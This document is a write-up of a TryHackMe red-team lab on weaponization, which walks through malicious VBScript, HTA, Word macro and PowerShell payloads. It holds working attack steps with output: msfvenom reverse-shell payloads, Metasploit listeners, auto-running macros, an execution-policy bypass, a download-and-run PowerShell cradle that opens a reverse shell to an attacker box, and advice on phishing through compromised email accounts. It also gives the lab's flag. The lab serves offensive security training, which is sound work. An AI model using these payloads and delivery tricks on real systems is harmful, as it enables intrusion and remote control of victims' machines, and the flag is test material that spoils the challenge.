#weaponization

Task 1 - Introduction
-----------------------------------

Here we go over some techniques for weaponization.


### What is Weaponization

This is the 2nd stage in the Cyber Kill Chain model.  This is where the attacker generates malicious code using deliverable payloads like PDF or Word documents, etc. This stage aims to use this weapon to target a machine and gain initial access.

Almost every company uses Windows in some form.  Nowdays most vectors are blocked. Such as just simply sending an .exe file, so we need to be more creative and use obfuscated and custom payloads send in various methods like phishing campaigns, social engineering, exploits, usb or web methods.

The following is an example where a custom PDF or .doc file is used to deliver a malicious payload. Then the payload will connect back to the C2 framework in our Red Team Infrastructure.

![[weaponization-1.png]]

For more information about red team toolkits, please visit the following: a [GitHub repository](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development) that has it all, including initial access, payload development, delivery methods, and others.

Since many common vectors are blocked, we will focus on some LoTL (Living off the Land) technics using internal scripting like:

-   The Windows Script Host (WSH)
-   An HTML Application (HTA)
-   Visual Basic Applications (VBA)
-   PowerShell (PSH)

__Questions__

Let's deploy the target machine in the next task, and we'll get started with the Windows Script Host technique in the subsequent task!
Answer: _None Needed_

Task 2 - Deploy the Windows Machine
---------------------------------------------------------------

Deploy the machine and connect.

```bash
user@machine$ xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3 +clipboard
```

The username: thm  and the password: TryHackM3

__Questions__
Deploy the attached Windows machine and connect to it via the RDP client. Once this is done, move to the next task.
Answer: _None Needed_

Task 3 - Windows Scripting Host (WSH)
----------------------------------------------------------------

Windows Scripting Host (WSH) is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.

It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe. For more information about VBScript, please visit [here](https://en.wikipedia.org/wiki/VBScript).  Since the engine runs with the same perms as the user it is useful for Red Teamers.

Put the following into a file called `hello.vbs`


```javascript
Dim message 
message = "Welcome to THM"
MsgBox message
```

Then we run it with wscript and get:

![[weaponization-2.png]]

Now let's use this way to run an executable file:

```javascript
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

Again, we run it with wscript:

```shell-session
c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
```

or with cscript:


```shell-session
c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
```

We got the calculator app to open on the desktop:

![[weaponization-3.png]]

Sometimes admins will blacklist .vbs script file extentions from running, but we can also execute them just by renaming them using a .txt extention.

```shell-session
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```

The result is the same, and calc will run.

__Questions__

Try to replace the calc.exe binary to execute cmd.exe within the Windows machine.
Answer: _None Needed_


Task 4 - An HTML Application (HTA)
----------------------------------------------------------

HTA stands for "HTML Application". These are dynamic HTML pages containing JScript and VBScript. One of the tools we can use to run these is `mshta`. This is one of the standard tools and what we refer to as one of the Living-Off-The-Land (LOLBINS) Binaries. It can be manually run or triggered to run automatically from Internet Edge/Exlorer.

In this example, we use an ActiveXObject in our payload to execute `cmd.exe`.

```javascript
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

Then we could serve this payload from our attackbox like this:

```bash
user@machine$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```

Now, on the victim machine, visit the malicious link using Microsoft Edge Browser:
`http://ATTACKBOX_IP:8090/payload.hta`

![[HTA-1.png]]

After pressing run the `payload.hta` gets executed and will invoke `cmd.exe`.

![[HTA-2.png]]

**HTA Reverse Connection**

We can do a reverse shell payload as follows:

```bash
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: thm.hta
```

Here we used msfvenom to create a malicious payload to connect back to the attack box.

On the Attack box we just need to run the following to catch the reverse shell:

```bash
sudo  nc -lvp 443
```

Here is what we can once the connection is made:

```bash
user@machine$ sudo nc -lvp 443
listening on [any] 443 ...
10.8.232.37: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.201.254] 52910
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads>
pState\Downloads>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::fce4:699e:b440:7ff3%2
   IPv4 Address. . . . . . . . . . . : 10.10.201.254
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1
```

### Malicious HTA via Metasploit

We can also use the Metasploit framework to generate these types of HTA payloads.

First run:
`msfconsole -q`  

We can use the following exploit:
`exploit/windows/misc/hta_server`

We then just need to complete the options:
**LHOST, LPORT, SRVHOST, Payload**

Then run the `execute` command as shown:

```bash
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) >
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.
```

As we see, Metaploit generates the URL we can use to provide our victim.
http://10.8.232.37:8080/TkWV9zkd.hta

Once the victim opens this URL in a browser we should get a reverse connection back.

```bash
user@machine$ [*] 10.10.201.254    hta_server - Delivering Payload
[*] Sending stage (175174 bytes) to 10.10.201.254
[*] Meterpreter session 1 opened (10.8.232.37:443 -> 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600
msf6 exploit(windows/misc/hta_server) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DESKTOP-1AU6NT4
OS              : Windows 10 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter > shell
Process 4124 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\app>
```

__Questions__
Now, apply what we discussed to receive a reverse connection using the user simulation machine in the Practice Arena task.
Answer: _None Needed_


Task 5 - Visual Basic for Application - VBA
--------------------------------------------------------------------

### Visual Basic for Application (VBA)

Visual Basic for Applications is a programming language by Microsoft implemented for applications such as Word, Excel and PowerPoint. This allows automating tasks of almost all keyboard/mouse interactions between the user and these MS Office applications.

Macros are these Office Applications that have embedded code from VBA. One feature of VBA is to access the Windows Application Programming Interface.

In this tasks we will explore using VBA to create malicious payloads in the form of MS Word documents.

After opening Microsoft Word, we can create a blank document and create our first macro. Once you have a doc opened, then open the Visual Basic Editor by selecting **View** -> **macros**.  This brings up the macros window:

![[vbamacros-1.png]]

Put the name **THM**, and select the dropdown box below **Macros in:** and select **Document1 (document)** from the dropdown, then we can click **Create**

Next in the resulting editor let's try adding the following code to display a messagebox:

```javascript
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```

Next we can run the macro by using the **F5** key or by using the **Run** -> **Run Sub/UserForm** interface.

Great! Now in order to get this to execute automatically when a user opens the document, we can use the built-in functions such as **AutoOpen** and **Document_open**. Note that we need to specify the document function name we named the macro. In our case THM.

```vbscript
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```

It is important to note that to make the macro work, we need to save it in Macro-Enabled format such as **.doc** and **docm**. 

Now let's save the file as **Word 97-2003 Template** where the Macro is enabled by going to **File** → **save Document1** and save as **type** → **Word 97-2003 Document** and finally, **save**.

![[vbamacros-2.png]]

Now close the Word Document and reopen it. We should get a security warning that **Macros have been disabled**, but there is an option for us to enable it. 

![[vbamacros-3.png]]

Once we enable the content our macro is shown:

![[vbamacros-4.png]]

Now edit the word document again and create a macro function that open the calculator (calc.exe) or any .exe file as a PoC.

```vbscript
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

You can test it using the options mentioned before.  Make sure you do the **AutoOpen()** and **Document_open()** functions and they contain the name of the macro before you save. 


![[vbamacros-5.png]]


We can combine these methods with other LOLBINS like HTAs.

__Questions__

Lets make an in-memory Meterpreter payload to receive a shell. Create the payload from the Attackbox using msfvenom:

```bash
user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of vba file: 2698 bytes
```

Just make sure to set the proper LHOST. Either the tun0 of your own VM connected to VPN or the AttackBox IP.

NOTE: We need to change **Workbook_Open()** to **Document_Open()** to make it suitable for MS word docs.

Now copy the output we get and paste it into the macro editor as we did befoe.

From the attackbox, run the Metasploit framework and set the listener:

```bash
user@AttackBox$ msfconsole -q
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.50.159.15
LHOST => 10.50.159.15
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
```

Now when the malicious doc is opened on the victim's machine, we should get a reverse shell.

```bash
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
[*] Sending stage (176195 bytes) to 10.10.215.43
[*] Meterpreter session 1 opened (10.50.159.15:443 -> 10.10.215.43:50209) at 2021-12-13 10:46:05 +0000
meterpreter >
```

Now replicate and apply what we discussed to get a reverse shell!
Answer: _None Needed_




Task 6 - PowerShell - PSH
-------------------------------------------

### PowerShell (PSH)

PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime in .NET. 

RedTeamers rely on PowerShell to do many kinds of activities such as gaining initial access, enumerations, etc. Let's do a simple one first:


```powershell
Write-Output "Welcome to the Weaponization Room!"
```

Save it as thm.ps1, then run it:

```shell
C:\Users\thm\Desktop>powershell -File thm.ps1
File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
    + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnauthorizedAccess

C:\Users\thm\Desktop>
```

### Execution Policy

PowerShell has an executio policy that is a security option to protect the system from malicious activities. PowerShell is disabled by default.  The default mode is Restricted, which means it can run individual commands but not scripts.

You can find the current PowerShell setting as follows:

```powershell
PS C:\Users\thm> Get-ExecutionPolicy
Restricted
```

We can also change it like this:

```powershell
PS C:\Users\thm\Desktop> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A
```

### Bypass Execution Policy

Microsoft provides a way to bypass this restriction. You can simply give an argument to your PowerShell command to change it to the desired setting. We can use the option `-ex bypass` which basically means nothing is blocked or restricted.

In order to make sure our script gets executed let's try that option here:

```shell
C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
Welcome to Weaponization Room!
```

Now let's try to get a reverse shell using one of the many tools written in PowerShell. In this case we will use [powercat](https://github.com/besimorhino/powercat.git).

```bash
user@machine$ git clone https://github.com/besimorhino/powercat.git
Cloning into 'powercat'...
remote: Enumerating objects: 239, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
Resolving deltas: 100% (72/72), done.
```

Now we can setup a web server on our AttackBox to host it:

```bash
user@machine$ cd powercat
user@machine$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

On the AttackBox, we need to listen on port 1337 using nc to receive the connection back from the victim.

```bash
user@machine$ nc -lvp 1337
```

Now back on the Victim's Windows PC, we can download and execute it using PowerShell payload like this:

```shell
C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```

Now the Victim's PC should download our hosted powercat script and automatically run it. It should then connect back to our AttackBox on port 1337:

```bash
user@machine$ nc -lvp 1337  listening on [any] 1337 ...
10.10.12.53: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\thm>
```

__Quetions__

Apply what you learned in this task. In the next task, we will discuss Command and Control frameworks!
Answer: _None Needed_


Task 7 - Command and Control - (C2 Or C&C)
-------------------------------------------------------------------------

In this room we will cover some basic aspects of Command and Control frameworks.

![[command-and-control-1.jpg]]

### What is Command and Control (C2)?

C2 frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines. C2 provides fast and straightforward approaches to:

-   Generate various malicious payloads
-   Enumerate the compromised machine/networks
-   Perform privilege escalation and pivoting
-   Lateral movement 
-   And many others

Here are some popular ones:

Cobalt Strike, PowerShell Empire, Metasploit.

### Cobalt Strike

Cobalt Strike is a commercial framework that focuses on Adversary Simulations and Red Team Operations. It is a combination of remote access tools, post-exploitation capabilities, and a unique reporting system. It provides an agent with advanced techniques to establish covert communications and perform various operations, including key-logging, files upload and download, VPN deployment, privilege escalation techniques, mimikatz, port scanning, and the most advanced lateral movements.

### PowerShell Empire

PowerShell Empire is an open-source framework that helps red team operators and pen testers collaborate across multiple servers using keys and shared passwords. It is an exploitation framework based on PowerShell and Python agents. PowerShell Empire focuses on client-side and post-exploitation of Windows and Active Directory environment. If you want to learn more about PowerShell Empire, we suggest trying out this room: [Empire](https://tryhackme.com/room/rppsempire).

### Metasploit 

Metasploit is a widely used exploitation framework that offers various techniques and tools to perform hacking easily. It is an open-source framework and is considered one of the primary tools for pentesting and red team operations. Metasploit is one of the tools we use in this room to generate payload for our weaponization stage. If you want to learn more about the Metasploit framework, we suggest trying out the following two rooms: [Metasploit: Introduction](https://tryhackme.com/room/metasploitintro) and [Metasploit](https://tryhackme.com/room/rpmetasploit).

__Questions__

Read the above.
Answer: _None Needed_


Task 8 - Delivery Techniques
--------------------------------------------------

Delivery is one of the most important factors for getting intial access. These have to look professional and legitimate enough to convince the victim to click, or follow through with the content.

### Email Delivery

It is a common method to use in order to send the payload by sending a phishing email with a link or attachment. For more info, visit [here](https://attack.mitre.org/techniques/T1566/001/).

This method attaches a malicious file to an email with the goal of the user to visit a malicious website, follow the content, execute a file etc. so that we can gain an inital foothold in the victim's network or host.

The Red Teamers should have their own infrastructure for phishing. Depending on the requirements this means you would need:

* Email Server
* DomainKeys Identified Mail (DKIM)
* Sender Policy Framework (SPF)
* DNS Pointer (PTR) record

The Red Teamers can also use 3rd-party email services like Gmail, Yahoo and others which have a good reputation.

One of the best is to use a compromised email account since we can use a legitimage account inside a reputable company to send our phishing emails to others.


### Web Delivery

Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visit [here](https://attack.mitre.org/techniques/T1189/).

Here we need to use Social Engineering to trick a victim into visiting the site and downloading the malicious content. A URL shortener can be helpful, but unless you host your own, be aware that most of the public ones log IPs.

In this method other techniques can be combined and used. An attacker can take advantage of zero-day exploits to exploit vulnerable software then use those for phishing campaigns. Use your imagination.

### USB Delivery

This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about USB delivery, visit [here](https://attack.mitre.org/techniques/T1091/).

Many companies nowdays enforce policies to disable USB usage within their organization for security purposes.

Common USB attacks used to weaponize USB devices include [Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe) and [USBHarpoon](https://www.minitool.com/news/usbharpoon.html), charging USB cable, such as [O.MG Cable](https://shop.hak5.org/products/omg-cable).

__Questions__

Which method is used to distribute payloads to a victim at social events?
Answer: _USB Delivery_


Task 9 - Practice Arena
----------------------------------------

We have prepared a Windows 10 machine that runs a user simulation web app to execute your payloads or visit the malicious HTA links automatically. Deploy the attached machine and wait a couple of minutes until it's up and running. Then, visit the user simulator web application at http://MACHINE_IP:8080/.

Make sure to visit the user simulator web application from the AttackBox, or you can access it by connecting to the VPN.

![[practice-arena-1.png]]

The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a malicious HTA link, the web application will visit your link.

**Note for Doc files**: the simulation used in the provided Windows 10 machine will open the malicious Word document and be closed within 90 seconds. In order to get longer prescience, you need to migrate as soon as you receive the connection back. 

In the Metasploit framework, we can inject our current process into another process on the victim machine using migrate. In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using migrate post-module as follow,

```bash
meterpreter > run post/windows/manage/migrate 

[*] Running module against DESKTOP-1AU6NT4
[*] Current server process: svchost.exe (3280)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 4960
[+] Successfully migrated into process 4960
```

In this task, the goal is to generate a reverse shell payload of your choice and send it through the web application. Once the web application runs your payload, you should receive a connect back. Answer the question below and prove your access by finding the flag once you receive a reverse shell.

For reference, you can use the MSFVenom Cheat Sheet on this [website](https://web.archive.org/web/20220607215637/https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/).

```bash
 kali@kali  ~  msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f hta-psh -o thm.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7776 bytes
Saved as: thm.hta

 kali@kali  ~  mkdir playground                                                                           
 kali@kali  ~  mv thm.hta playground/.                  
 kali@kali  ~  cd playground                             
 kali@kali  ~/playground  ls
thm.hta
 kali@kali  ~/playground  python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.47.179 - - [23/Jan/2023 10:05:46] "GET /thm.hta HTTP/1.1" 200 -
```

Catching the shell and enumerating for flag
```bash
kali@kali  ~  sudo nc -nvlp 443                                  
[sudo] password for kali: 
listening on [any] 443 ...
connect to [tun0] from (UNKNOWN) [10.10.47.179] 49715
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\app>cd ..
cd ..

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9855-3AC5

 Directory of C:\Users

10/21/2021  01:37 AM    <DIR>          .
10/21/2021  01:37 AM    <DIR>          ..
12/09/2016  05:10 PM    <DIR>          defaultuser0
12/09/2016  05:15 PM    <DIR>          Public
01/22/2023  05:00 PM    <DIR>          thm
               0 File(s)              0 bytes
               5 Dir(s)  36,127,854,592 bytes free

C:\Users>cd thm
cd thm

C:\Users\thm>cd Desktop
cd Desktop

C:\Users\thm\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9855-3AC5

 Directory of C:\Users\thm\Desktop

11/27/2021  10:25 AM    <DIR>          .
11/27/2021  10:25 AM    <DIR>          ..
11/27/2021  10:25 AM                37 flag.txt
               1 File(s)             37 bytes
               2 Dir(s)  36,127,854,592 bytes free

C:\Users\thm\Desktop>type flag.txt
type flag.txt
THM{b4dbc2f16afdfe9579030a929b799719}
C:\Users\thm\Desktop>
```

NOTE: This could have been done many ways. Using Metasploit is easiest, but I recommend not using Metasploit as much as possible because most test exams like the OSCP may dis-allow the use of such tools. That said. it is worthwhile to become proficient with all these tools because in the real world you will most assuredly use them.

__Questions__

What is the flag? **Hint**: Check the user desktop folder for the flag. An easy was it HTA method.
Answer: _THM{b4dbc2f16afdfe9579030a929b799719}_

